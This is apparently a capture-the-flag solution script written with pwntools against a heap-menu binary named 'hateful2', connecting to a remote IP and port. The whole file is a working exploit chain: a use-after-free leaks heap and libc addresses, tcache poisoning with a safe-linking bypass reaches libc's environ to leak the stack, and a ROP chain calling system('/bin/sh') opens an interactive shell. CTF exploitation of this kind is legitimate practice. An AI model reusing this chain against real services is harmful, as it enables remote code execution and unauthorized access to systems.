#!/usr/bin/nv python3




from pwn import *



e = ELF("./hateful2_patched")
#r = process("./hateful2_patched")
r = remote("52.59.124.14",5022)
libc = ELF("./libc.so.6")


def read_message(index):
    r.sendlineafter(b">>",b"3")
    r.sendlineafter(b"Message Index:",f"{index}")

def edit_message(index,data):
    r.sendlineafter(b">>",b"2")
    r.sendlineafter(b"Message Index:",f"{index}")
    r.sendlineafter(b">>",data)
def add_message(index,size,data):
    r.sendlineafter(b">>",b"1")
    r.sendlineafter(b"Message Index:",f"{index}")
    r.sendlineafter(b"Message Size:",f"{size}")
    r.sendafter(b">>",data)
def delete_message(index):
    r.sendlineafter(b">>",b"4")
    r.sendlineafter(b"Message Index:",f"{index}")

add_message(0,0x288,b"Alloc 1")
add_message(1,0x288,b"Alloc 2")
delete_message(0)
read_message(0)
r.recvuntil(b" Message: ")
heap_leak = (u64(r.recvline().strip().decode('latin-1').ljust(8,'\x00')) << 12) 
add_message(2,0x418,b"Alloc 3")
add_message(3,0x28,b"Alloc 4")
delete_message(2)
read_message(2)
r.recvuntil(b" Message: ")
libc_leak = u64(r.recvline().strip().decode("latin-1").ljust(8,'\x00'))  - 0x1d2cc0
log.info("The libc base of the process is " + hex(libc_leak))
environ = libc_leak + 0x1da320
log.info("The location where the environ variable stored is " + hex(environ))
delete_message(1)
edit_message(1,p64((heap_leak + 0x10) ^ ((heap_leak + 0x530)  >> 12)))
add_message(0,0x288,b"A" * 0x4)
add_message(1,0x288,p64(0x1)  + p64(0) * 15 + p64(libc_leak + libc.sym.environ - 0x10))
add_message(3,0x18,b"A" * 0x10)
read_message(3)
r.recvuntil(b"A" * 0x10)
stack_leak = u64(r.recvline().strip().decode('latin-1').ljust(8,'\x00')) - 0x128
log.info("The stack leak of the process is " + hex(stack_leak))
edit_message(1,p16(0x1) * 4 + p64(0) * 15 + p64(stack_leak) * 4)
add_message(0,0x48,b"A" * 8 +  p64(libc_leak + 0x277e6) + p64(libc_leak + 0x277e5) + p64(libc_leak + next(libc.search(b"/bin/sh\x00"))) + p64(libc_leak + libc.sym.system))
r.sendlineafter(b">>",b"5")
r.interactive()
